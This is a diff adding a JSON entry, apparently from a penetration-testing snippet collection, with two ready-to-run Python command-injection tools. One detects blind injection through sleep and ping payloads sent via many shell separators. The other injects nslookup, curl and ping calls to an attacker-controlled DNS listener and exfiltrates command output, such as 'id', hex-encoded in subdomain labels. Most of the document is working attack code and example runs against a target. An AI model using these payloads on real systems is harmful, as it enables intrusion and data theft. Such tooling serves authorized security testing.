@@ -1,0 +1,43 @@
+{
+  "category": "Command Injection",
+  "group": "exploit",
+  "catOrder": 14,
+  "entries": [
+    {
+      "title": "Time-based command injection detector (separators x sleep)",
+      "lang": "python",
+      "tags": [
+        "cmdi",
+        "blind",
+        "time-based",
+        "detect"
+      ],
+      "rating": "must",
+      "deps": "pip install requests",
+      "placeholders": "{{URL}} (injection point = *) · {{PARAM}}",
+      "source": "https://portswigger.net/web-security/os-command-injection",
+      "license": "GPL-3.0 (original)",
+      "body": "Finds blind OS command injection where the command output is not visible. It iterates over **separators** (`;`, `|`, `&&`, `$()`, backticks, `%0a` = newline) and wraps `sleep`/`ping` in them, provoking a controlled response delay. First it measures a baseline (median of 3 requests), then sends a payload with a `--delay`-second delay and, on a hit, performs a **control repeat** to filter out network jitter. It hits GET, POST, header and cookie. For Linux and Windows (there `ping -n` is used instead of sleep).\n\n> This is a detector, not an exploit: it confirms the injection by timing and tells you which separator worked. To extract data, use the OOB variant below or the payload cards. On slow targets, increase `--delay`.\n\n```python\n#!/usr/bin/env python3\n# cmdi_time.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.\nimport argparse, statistics, time, requests\nrequests.packages.urllib3.disable_warnings()\n\n# {d} = delay seconds. %0a is a raw newline separator (URL-encoded).\ndef payloads(delay):\n    nix = f\"sleep {delay}\"\n    win = f\"ping -n {delay+1} 127.0.0.1\"\n    seps = [\n        (\"; {c}\",     \"semicolon\"),\n        (\"| {c}\",     \"pipe\"),\n        (\"|| {c}\",    \"or\"),\n        (\"& {c}\",     \"amp\"),\n        (\"&& {c}\",    \"and\"),\n        (\"$({c})\",    \"subshell\"),\n        (\"`{c}`\",     \"backtick\"),\n        (\"\\n{c}\\n\",   \"newline\"),\n        (\"%0a{c}\",    \"newline-enc\"),\n    ]\n    out = []\n    for tmpl, name in seps:\n        out.append((tmpl.format(c=nix), f\"nix/{name}\"))\n        out.append((tmpl.format(c=win), f\"win/{name}\"))\n    return out\n\ndef send(s, a, payload):\n    val = (a.base + payload) if a.base else payload\n    full = a.url.replace(\"*\", val) if \"*\" in a.url else a.url\n    ck = dict(c.split(\"=\", 1) for c in a.cookie.split(\";\") if \"=\" in c) if a.cookie else {}\n    hdr = {}\n    if a.header:\n        hdr[a.header] = val\n    if a.where == \"cookie\":\n        ck[a.param] = val\n    t0 = time.time()\n    try:\n        if a.where == \"POST\":\n            s.post(a.url, data={a.param: val}, cookies=ck or None, headers=hdr, verify=False, timeout=60)\n        else:  # GET / header / cookie\n            s.get(full, cookies=ck or None, headers=hdr, verify=False, timeout=60)\n    except requests.RequestException:\n        return 0.0\n    return time.time() - t0\n\ndef main():\n    ap = argparse.ArgumentParser(description=\"ARS3NAL time-based command-injection detector\")\n    ap.add_argument(\"-u\", \"--url\", required=True, help=\"URL with * at the injection point\")\n    ap.add_argument(\"--where\", default=\"GET\", choices=[\"GET\", \"POST\", \"header\", \"cookie\"])\n    ap.add_argument(\"--param\", default=\"q\", help=\"param/cookie name for POST/cookie\")\n    ap.add_argument(\"--header\", default=\"\", help=\"header name to inject into (e.g. User-Agent)\")\n    ap.add_argument(\"--base\", default=\"\", help=\"valid base value prepended to payload (e.g. '127.0.0.1')\")\n    ap.add_argument(\"--cookie\", default=\"\")\n    ap.add_argument(\"--delay\", type=int, default=5)\n    a = ap.parse_args()\n    s = requests.Session(); s.headers[\"User-Agent\"] = \"ARS3NAL-CMDi/1.0\"\n\n    base = statistics.median([send(s, a, \"\") for _ in range(3)])\n    thr = base + a.delay * 0.7\n    print(f\"[*] baseline={base:.2f}s threshold={thr:.2f}s where={a.where}\")\n    for payload, name in payloads(a.delay):\n        if send(s, a, payload) >= thr:\n            if send(s, a, payload) >= thr:  # confirm on repeat\n                print(f\"[+] VULN  sep={name}  payload={payload!r}\")\n            else:\n                print(f\"[~] flaky {name} (one hit, no confirm)\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\nRun:\n```bash\npython3 cmdi_time.py -u \"https://target/ping?host=*\" --base \"127.0.0.1\" --delay 5\npython3 cmdi_time.py -u \"https://target/api\" --where POST --param host --delay 5\npython3 cmdi_time.py -u \"https://target/\" --where header --header \"User-Agent\" --delay 5\n```"
+    },
+    {
+      "title": "OOB command injection via DNS callback",
+      "lang": "python",
+      "tags": [
+        "cmdi",
+        "blind",
+        "oob",
+        "dns",
+        "exfil"
+      ],
+      "rating": "must",
+      "badges": [
+        "oob"
+      ],
+      "deps": "pip install requests",
+      "placeholders": "{{URL}} (injection point = *) · {{COLLAB}} (your own DNS/HTTP listener)",
+      "source": "https://portswigger.net/web-security/os-command-injection",
+      "license": "GPL-3.0 (original)",
+      "body": "When timing falls short (a firewall cuts off sleep, the response is always instant), we confirm the injection via an **out-of-band DNS request**. The target resolves your controlled domain (`nslookup`/`curl`/`ping` to `id.{{COLLAB}}`) - and the arrival of the request at your listener proves RCE. At the same time you can **exfiltrate the output**: the command is hex-encoded and travels in the subdomain label.\n\n> Badge OOB: you need an external DNS/HTTP server that you control (your own authoritative domain, an interactsh server or Burp Collaborator). The script only generates and sends the payload - your listener catches the requests.\n\n```python\n#!/usr/bin/env python3\n# cmdi_oob.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.\nimport argparse, uuid, requests\nrequests.packages.urllib3.disable_warnings()\n\ndef build(collab, token, cmd):\n    sub = f\"{token}.{collab}\"\n    # nix: DNS lookups that resolve the unique subdomain\n    nix = [\n        f\";nslookup {sub};\",\n        f\";curl http://{sub}/;\",\n        f\"`ping -c1 {sub}`\",\n        f\"$(host {sub})\",\n    ]\n    # exfil one short command's output into the subdomain label (hex-encoded)\n    if cmd:\n        nix.append(f\";A=$({cmd}|xxd -p|head -c40);nslookup $A.{collab};\")\n    win = [\n        f\"&nslookup {sub}&\",\n        f\"|nslookup {sub}\",\n    ]\n    return nix + win\n\ndef send(s, a, payload):\n    val = (a.base + payload) if a.base else payload\n    full = a.url.replace(\"*\", val) if \"*\" in a.url else a.url\n    try:\n        if a.where == \"POST\":\n            s.post(a.url, data={a.param: val}, verify=False, timeout=20)\n        else:\n            s.get(full, verify=False, timeout=20)\n    except requests.RequestException:\n        pass\n\ndef main():\n    ap = argparse.ArgumentParser(description=\"ARS3NAL OOB (DNS) command-injection prober\")\n    ap.add_argument(\"-u\", \"--url\", required=True, help=\"URL with * at the injection point\")\n    ap.add_argument(\"--collab\", required=True, help=\"your DNS listener domain, e.g. abc.oast.fun\")\n    ap.add_argument(\"--where\", default=\"GET\", choices=[\"GET\", \"POST\"])\n    ap.add_argument(\"--param\", default=\"q\")\n    ap.add_argument(\"--base\", default=\"\")\n    ap.add_argument(\"--cmd\", default=\"\", help=\"optional short command to exfil (e.g. 'id')\")\n    a = ap.parse_args()\n    s = requests.Session(); s.headers[\"User-Agent\"] = \"ARS3NAL-CMDi/1.0\"\n    for payload in build(a.collab, uuid.uuid4().hex[:8], a.cmd):\n        print(f\"[>] sending {payload!r}\")\n        send(s, a, payload)\n    print(\"[*] done - watch your DNS/HTTP listener for callbacks\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\nRun:\n```bash\n# start a listener (interactsh-client / your own authoritative DNS) and substitute the domain\npython3 cmdi_oob.py -u \"https://target/ping?host=127.0.0.1*\" --collab abc123.oast.fun --cmd id\n```"
+    }
+  ]
+}
